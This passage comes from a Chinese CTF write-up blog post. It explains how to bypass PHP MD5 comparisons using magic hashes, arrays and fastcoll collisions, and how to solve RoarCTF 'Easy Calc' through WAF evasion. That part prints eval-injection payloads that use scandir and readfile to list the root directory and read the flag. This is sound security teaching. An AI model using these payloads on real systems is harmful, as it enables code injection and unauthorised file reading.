$val9 &#x3D; strtr(md5($b), $m, $n);

echo PHP_EOL;
echo &quot;&lt;p&gt;val8 : $val8&lt;&#x2F;p&gt;&quot;;
echo PHP_EOL;
echo &quot;&lt;p&gt;val9 : $val9&lt;&#x2F;p&gt;&quot;;
echo PHP_EOL;
if (($val8 &#x3D;&#x3D; $val9) &amp;&amp; !($a &#x3D;&#x3D;&#x3D; $b) &amp;&amp; (strlen($b) &#x3D;&#x3D;&#x3D; 5))
&#123;
    echo &quot;nice,good job,give you flag:&quot;;
    echo file_get_contents(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&#39;);
&#125;</code></pre>

<p>代码审计一个一个绕</p>
<p>第1、2个if：<code>val1</code>不能和<code>val2</code>一样，且<code>val1</code>和<code>val2</code>的MD5值需要相同，由于这里是用<code>!=</code>进行判断的，于是就可以用MD5弱比较进行绕过；这里给出两个可以绕过比较的字符串<code>s878926199a</code>和<code>s155964671a</code>、payload：<code>?val1=s878926199a&amp;val2=s155964671a</code>、随后进入下个if（当然这里也可以用数组绕过，下两个if解释）</p>
<blockquote>
<p>注：<code>s878926199a</code>的MD5值为<code>0e545993274517709034328855841020</code>，<code>s155964671a</code>的MD5值为<code>0e342768416822451524974117254469</code>函数在执行<code>!=</code>判断的时候会认为是以<code>0e</code>开头的科学计数法，所以两边都为0，即构成了弱比较绕过</p>
</blockquote>
<p>第3、4个if：<code>val3</code>不能和<code>val4</code>一样，且<code>val3</code>和<code>val4</code>的MD5值需要相同，而这里使用的是<code>!==</code>进行判断，这种判断会对MD5加密后的字符串进行严格的逐个字符判断，所以使用上面的方法是无效的，但是这里可以使用数组类型进行绕过，由于MD5函数无法处理数组，所以两边返回的都是<code>NULL</code>（上两个if也适用），就构成了绕过；payload：<code>?val1=s878926199a&amp;val2=s155964671a&amp;val3[]=1&amp;val4[]=2</code></p>
<p>第5、6个if：这里的函数需要让<code>val5</code>、<code>val6</code>、<code>val7</code>都不相等，且三个值的MD5值需要相同，并且使用的是<code>!==</code>进行判断，且在获取数值的时候进行了<code>string</code>类型转换，如果是数组的话会直接转换不成功，三个值没得到东西，第一个判断都过不了，这里就需要找到三个真正相等的MD5值的原型，这里就需要参考一篇文章：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3161#toc-5">基于全等的MD5碰撞绕过</a>、如文章所述（cmd中执行）：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">fastcoll_v1.0.0.5.exe -o 0 1    -o参数代表随机生成两个相同MD5的文件
fastcoll_v1.0.0.5.exe -p 1 -o 00 01    -p参数代表根据1文件随机生成两个相同MD5的文件，注意：生成的MD5与1不同
tail.exe -c 128 00 &gt; a    -c 128代表将00的最后128位写入文件a，这128位正是1与00的MD5不同的原因
tail.exe -c 128 01 &gt; b    同理
type 0 a &gt; 10    这里表示将0和a文件的内容合并写入10
type 0 b &gt; 11    这里表示将0和b文件的内容合并写入11</code></pre>

<p><a target="_blank" rel="noopener" href="http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip">fastcoll下载链接</a>、<a target="_blank" rel="noopener" href="https://www.trisunsoft.com/tail-for-windows.htm">tail.exe下载链接</a></p>
<p>这样就生成了4个MD5值相同的文件，查看四个文件的MD5值，是预期结果</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200227120733977.png" alt loading="lazy"></p>
<p>于是在PHP中生成其中三个的urlencode的值：</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php 
function  readmyfile($path)&#123;
    $fh &#x3D; fopen($path, &quot;rb&quot;);
    $data &#x3D; fread($fh, filesize($path));
    fclose($fh);
    return $data;
&#125;
echo &#39;二进制hash &#39;.md5((readmyfile(&quot;00&quot;)));
echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;
echo  &#39;URLENCODE &#39;.urlencode(readmyfile(&quot;00&quot;));
echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;
echo &#39;URLENCODE hash &#39;.md5(urlencode (readmyfile(&quot;00&quot;)));
echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;
echo &#39;二进制hash &#39;.md5((readmyfile(&quot;10&quot;)));
echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;
echo  &#39;URLENCODE &#39;.urlencode(readmyfile(&quot;10&quot;));
echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;
echo &#39;URLENCODE hash &#39;.md5(urlencode(readmyfile(&quot;10&quot;)));
echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;
echo &#39;二进制hash &#39;.md5((readmyfile(&quot;11&quot;)));
echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;
echo  &#39;URLENCODE &#39;.urlencode(readmyfile(&quot;11&quot;));
echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;
echo &#39;URLENCODE hash &#39;.md5( urlencode(readmyfile(&quot;11&quot;)));
echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;</code></pre>

<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200227121027756.png" alt loading="lazy"></p>
<pre class="language-HTML" data-language="HTML"><code class="language-HTML">二进制hash 4e7b1d0c72b69df7992d15f72f7c2056

URLENCODE %E5WVVB%15%C6%E6%BD%A8%3C%07E+%3C%92l%95hWq%23%FEn%1CbxRk%AE%07%F1v%03%C1%E7%D0dG7%CB%0F%E1%1B%D4%C9K%F6%F3%81%18%FA%D3%21%7E%CB%7D%FB%B6%C2l%5C%8D2%8F%04%97%83%3ARz%19%D7hf.%04%11%E6%81%5DE%D6%9C2%2C%0Fkv%D9%D3%DBOP%2BA%E1h%B8%8E%04l%82%1E%1D%BDkY%92%93I%01%21%24%B9%D7%EDb%97Hk%21%5DX6%8Aq%11%DC%0DD%F7%11%A0QUC%7C%F2%AD%AEn%FD%01%C9%0F%27%1B%E2%D1%06%88%1B%CEyR%A7%1A7%BCL%BB%AF%DF%D8%AB%1B%2A%E7%FB%D0s%D5%8B%05jh%FE%8A%BCc%9F%16%2A%A6%93%0A%AB%8BR%2A%22%14%06%BF%00%DFS%A2%D8%B5%039%F5%D5CZ%F5%AA%88Q%DE%25%7D+%19%CD%9B%F5%CC%D9%29%5D%B2%BB%7E%97%FA7%E6%7E%E0%A7%AF%CC%AF%7D%C1o%CA%CA%9F%CB%27F%7DL%E9%C0%D3%DA%3Cm%14%3C%81

URLENCODE hash c09ff9138646c9e4ad9234d07ed6f935

二进制hash 4e7b1d0c72b69df7992d15f72f7c2056

URLENCODE %E5WVVB%15%C6%E6%BD%A8%3C%07E+%3C%92l%95h%D7q%23%FEn%1CbxRk%AE%07%F1v%03%C1%E7%D0dG7%CB%0F%E1%1B%D4IK%F6%F3%81%18%FA%D3%21%7E%CB%7D%FB%B6Bl%5C%8D2%8F%04%97%83%3ARz%19%D7hf.%04%11%E6%81%5DE%D6%1C2%2C%0Fkv%D9%D3%DBOP%2BA%E1h%B8%8E%04l%82%1E%1D%BDkY%92%13J%01%21%24%B9%D7%EDb%97Hk%21%5D%D86%8Aq%11%DC%0DD%F7%11%A0QUC%7C%F2%AD%AEn%FD%01%C9%0F%27%1B%E2%D1%06%88%1B%CEyR%A7%1A7%BCL%BB%AF%DF%D8%AB%1B%2A%E7%FB%D0s%D5%8B%05jh%FE%8A%BCc%9F%16%2A%A6%93%0A%AB%8BR%2A%22%14%06%BF%00%DFS%A2%D8%B5%039%F5%D5CZ%F5%AA%88Q%DE%25%7D+%19%CD%9B%F5%CC%D9%29%5D%B2%BB%7E%97%FA7%E6%7E%E0%A7%AF%CC%AF%7D%C1o%CA%CA%9F%CB%27F%7DL%E9%C0%D3%DA%3Cm%14%3C%81

URLENCODE hash 6b9eaae07963a665dcc4cabcad530507

二进制hash 4e7b1d0c72b69df7992d15f72f7c2056

URLENCODE %E5WVVB%15%C6%E6%BD%A8%3C%07E+%3C%92l%95h%D7q%23%FEn%1CbxRk%AE%07%F1v%03%C1%E7%D0dG7%CB%0F%E1%1B%D4IK%F6%F3%81%18%FA%D3%21%7E%CB%7D%FB%B6Bl%5C%8D2%8F%04%97%83%3ARz%19%D7hf.%04%11%E6%81%5DE%D6%1C2%2C%0Fkv%D9%D3%DBOP%2BA%E1h%B8%8E%04l%82%1E%1D%BDkY%92%13J%01%21%24%B9%D7%EDb%97Hk%21%5D%D86%8Aq%11%DC%0DD%F7%11%A0QUC%7C%F2%AD%AEn%FD%01%C9%0F%27%9B%E2%D1%06%88%1B%CEyR%A7%1A7%BCL%BB%AF%DF%D8%AB%1B%2A%E7%FB%D0s%D5%0B%06jh%FE%8A%BCc%9F%16%2A%A6%93%0A%2B%8BR%2A%22%14%06%BF%00%DFS%A2%D8%B5%039%F5%D5CZ%F5%AA%88Q%5E%25%7D+%19%CD%9B%F5%CC%D9%29%5D%B2%BB%7E%97%FA7%E6%7E%E0%A7%AF%CC%AF%7DAo%CA%CA%9F%CB%27F%7DL%E9%C0%D3%DA%BCm%14%3C%81

URLENCODE hash 559062db66b89ca9e98b3900fc75066e</code></pre>

<p>复制到burp中发包，可以看到成功绕过了if，进入下面的if</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200227121221514.png" alt loading="lazy"></p>
<p>第7、8、9个if：POST两个值分别为<code>$a</code>和<code>$b</code>，<code>ctype_alnum()</code>表示函数内的值只能是字母个数字的组合，第7个if的意思我们的<code>$a</code>和<code>$b</code>需要满足<code>ctype_alnum()</code>函数，且长度不能大于五，第8个if的意思是get的参数<code>$m</code>和<code>$n</code>长度不能大于1，也就是只能为一个字符</p>
<p>后面的<code>$val8</code>为<code>$a</code>MD5加密后的值，<code>$val9</code>为<code>$b</code>结果MD5加密后，替换其中的<code>$m</code>值为<code>$n</code>的值</p>
<p>最后一个if：表示<code>$val8</code>和<code>$val9</code>的值都必须相等，注意这里是使用<code>==</code>进行判断，也就是说会认为<code>0e</code>开头的为科学计数法进行判断，<code>$a</code>和<code>$b</code>的值不能相等，且<code>$b</code>的长度必须为5</p>
<p>结果分析，有这种绕过方法：假设<code>$a</code>MD5加密后的值为<code>0e123421342...</code>、<code>$b</code>MD5加密后的值为<code>($m)e4657564745...</code>、就可以利用令<code>$n</code>=0来替换<code>$b</code>MD5加密后的第一位<code>$m</code>的值，从而构成绕过，这是我们只需要得到<strong>一个5位的MD5值开头<code>0e</code>后面跟的全是数字的MD5原型</strong>和<strong>一个5位的MD5值的第二位为e后面跟的全是数字的MD5原型</strong>，于是写脚本跑出这两个5位数：</p>
<pre class="language-python" data-language="python"><code class="language-python">import hashlib
def a():
    str &#x3D; &quot;qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890&quot;
    for i in str:
        for j in str:
            for m in str:
                for n in str:
                    for k in str:
                        payload &#x3D; (i+j+m+n+k).encode(&quot;utf-8&quot;)
                        str1 &#x3D; hashlib.md5(payload)
                        test1 &#x3D; str1.hexdigest()
                        if test1[0:2] &#x3D;&#x3D; &quot;0e&quot; and test1[2:].isdigit():
                            print(&quot;&#123;&#125;-&gt;&#123;&#125;&quot;.format(payload,test1))
                            return

def b():
    str &#x3D; &quot;qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890&quot;
    for i in str:
        for j in str:
            for m in str:
                for n in str:
                    for k in str:
                        payload &#x3D; (i+j+m+n+k).encode(&quot;utf-8&quot;)
                        str1 &#x3D; hashlib.md5(payload)
                        test2 &#x3D; str1.hexdigest()
                        if test2[1] &#x3D;&#x3D; &quot;e&quot; and test2[2:].isdigit():
                            print(&quot;&#123;&#125;-&gt;&#123;&#125;&quot;.format(payload,test2))
                            return

if __name__ &#x3D;&#x3D; &quot;__main__&quot;:
    a()
    b()</code></pre>

<p>得到的两个结果：</p>
<p><code>b&#39;byGcY&#39;-&gt;0e591948146966052067035298880982</code><br><code>b&#39;e2P2Z&#39;-&gt;3e297891816980937234055076451742</code></p>
<p>于是构造payload：</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200227130010106.png" alt loading="lazy"></p>
<p>发包得到flag</p>
<h1 id="HTTP走私"><a href="#HTTP走私" class="headerlink" title="HTTP走私"></a>HTTP走私</h1><h2 id="2019RoarCTF—Easy-Calc"><a href="#2019RoarCTF—Easy-Calc" class="headerlink" title="2019RoarCTF—Easy Calc"></a>2019RoarCTF—Easy Calc</h2><h3 id="界面"><a href="#界面" class="headerlink" title="界面"></a>界面</h3><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200206123430992.png" alt loading="lazy"></p>
<p>查看源代码后发现存在<code>calc.php</code></p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200206123604958.png" alt loading="lazy"></p>
<p>访问得到后台源码：</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
error_reporting(0);
if(!isset($_GET[&#39;num&#39;]))&#123;
    show_source(__FILE__);
&#125;else&#123;
        $str &#x3D; $_GET[&#39;num&#39;];
        $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;];
        foreach ($blacklist as $blackitem) &#123;
                if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $str)) &#123;
                        die(&quot;what are you want to do?&quot;);
                &#125;
        &#125;
        eval(&#39;echo &#39;.$str.&#39;;&#39;);
&#125;
?&gt;</code></pre>

<p>过滤了大多数字符，尝试了提交一些字符会报<code>403</code>错误</p>
<blockquote>
<p>403错误是一种在网站访问过程中，常见的错误提示，表示资源不可用。服务器理解客户的请求，但拒绝处理它，通常由于服务器上文件或目录的权限设置导致的WEB访问错误。</p>
</blockquote>
<h3 id="解题方法"><a href="#解题方法" class="headerlink" title="解题方法"></a>解题方法</h3><p>参考文章：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6654#toc-1">从一道题到协议层攻击之HTTP请求走私</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/yankai0219/article/details/8269922">http协议中content-length 以及chunked编码分析</a></li>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/213359.html">利用PHP的字符串解析特性Bypass</a></li>
</ul>
<h4 id="服务器http走私漏洞绕WAF"><a href="#服务器http走私漏洞绕WAF" class="headerlink" title="服务器http走私漏洞绕WAF"></a>服务器http走私漏洞绕WAF</h4><blockquote>
<p>前端服务器(CDN)和后端服务器接收数据不同步，引起对客户端传入的数据理解不一致，从而导致漏洞的产生。</p>
</blockquote>
<pre class="language-shell" data-language="shell"><code class="language-shell">num&#x3D;var_dump(base_convert(61693386291,10,36)(chr(47)))</code></pre>

<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200206144030983.png" alt loading="lazy"></p>
<pre class="language-shell" data-language="shell"><code class="language-shell">num&#x3D;var_dump(base_convert(2146934604002,10,36)(chr(47).base_convert(25254448,10,36)))</code></pre>

<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200206144200310.png" alt loading="lazy"></p>
<h4 id="PHP字符串解析特性绕过WAF"><a href="#PHP字符串解析特性绕过WAF" class="headerlink" title="PHP字符串解析特性绕过WAF"></a>PHP字符串解析特性绕过WAF</h4><p>PHP需要将所有参数转换为有效的变量名，因此，在解析查询字符串时，它会做两件事：</p>
<blockquote>
<ul>
<li>删除初始空格</li>
<li>将某些字符转换为下划线（包括空格）</li>
</ul>
</blockquote>
<pre class="language-shell" data-language="shell"><code class="language-shell">? num&#x3D;1;var_dump(scandir(chr(47)))</code></pre>

<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200206144515082.png" alt loading="lazy"></p>
<pre class="language-shell" data-language="shell"><code class="language-shell">? num&#x3D;1;var_dump(readfile(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></pre>

<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200206144617598.png" alt loading="lazy"></p>
</div><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="打赏" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-hand-coin-line"></use></svg></span><div id="reward-comment">I'm so cute. Please give me money.</div><div id="qr" style="display:none;"><div style="display:inline-block"><a href="/images/zfb.jpg"><img loading="lazy" src="/images/zfb.jpg" alt="支付宝" title="支付宝"></a><div><span style="color:#00A3EE"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-alipay-line"></use></svg></span></div></div><div style="display:inline-block"><a href="/images/qq.png"><img loading="lazy" src="/images/qq.png" alt="QQ 支付" title="QQ 支付"></a><div><span style="color:#12B7F5"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></span></div></div><div style="display:inline-block"><a href="/images/wx.png"><img loading="lazy" src="/images/wx.png" alt="微信支付" title="微信支付"></a><div><span style="color:#2DC100"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-wechat-pay-line"></use></svg></span></div></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>Extrader</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://www.extrader.top/posts/5d485480/" title="CTF-其它">https://www.extrader.top/posts/5d485480/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> 许可协议。</li></ul></section></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/posts/67caa546/" rel="prev" title="CTF-CVE"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-left-s-line"></use></svg><span class="post-nav-text">CTF-CVE</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/posts/3dae5dc2/" rel="next" title="一些排序和查找算法"><span class="post-nav-text">一些排序和查找算法</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div id="comment"><div class="comment-tooltip text-center"><span>若您想及时得到回复提醒，建议跳转 GitHub Issues 评论。</span><br><span>若没有本文 Issue，您可以使用 Comment 模版新建。</span><br><a class="hty-button hty-button--raised" id="github-issues" target="_blank" rel="noopener" href="https://github.com/Extrader-home/Extrader-home.github.io/issues?q=is:issue+CTF-其它">GitHub Issues</a></div><div id="valine-container"></div><script src="https://cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script><script>function initValine() {
  const valineConfig = {"enable":true,"appId":"D0RsYpx00piDirHr8rmxtml4-gzGzoHsz","appKey":"aCk3nRmmI5uzkoEoVjtToEe8","placeholder":"Just go go","avatar":null,"pageSize":10,"visitor":false,"highlight":true,"recordIP":false,"enableQQ":true,"meta":["nick","mail","link"],"el":"#valine-container","lang":"zh-cn"}
  valineConfig.path = window.location.pathname
  new Valine(valineConfig)
}
setTimeout(initValine, 1000)</script></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2020 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> Extrader</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v5.0.2</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v0.9.6</span></div><div class="live_time"><span>本博客已运行</span><span id="display_live_time"></span><span class="moe-text">(●'◡'●)</span><script>function blog_live_time() {
  window.setTimeout(blog_live_time, 1000);
  const start = new Date('2020-01-08T00:00:00');
  const now = new Date();
  const timeDiff = (now.getTime() - start.getTime());
  const msPerMinute = 60 * 1000;
  const msPerHour = 60 * msPerMinute;
  const msPerDay = 24 * msPerHour;
  const passDay = Math.floor(timeDiff / msPerDay);
  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
  display_live_time.innerHTML = " " + passDay + " 天 " + passHour + " 小时 " + passMinute + " 分 " + passSecond + " 秒";
}
blog_live_time();
</script></div></footer><a class="hty-icon-button" id="goUp" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-search-line"></use></svg></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script src="/js/search/local-search.js" defer></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-close-line"></use></svg></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div id="local-search-result"></div></div><div class="aplayer no-destroy" id="aplayer" data-id="590482322" data-server="netease" data-type="playlist" data-fixed="true" data-autoplay data-theme="#0078E7" data-loop="all" data-order="list" data-preload="auto" data-volume="0.7" data-mutex data-lrctype="0" data-listmaxheight="340px" data-storagename="metingjs"></div></div><script defer src="/js/utils.js"></script><script defer src="/js/hexo-theme-yun.js"></script><script src="https://cdn.jsdelivr.net/npm/live2d-widget@^3.1.3/lib/L2Dwidget.min.js"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"https://cdn.jsdelivr.net/npm/live2d-widget-model-wanko@1.0.5/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body></html>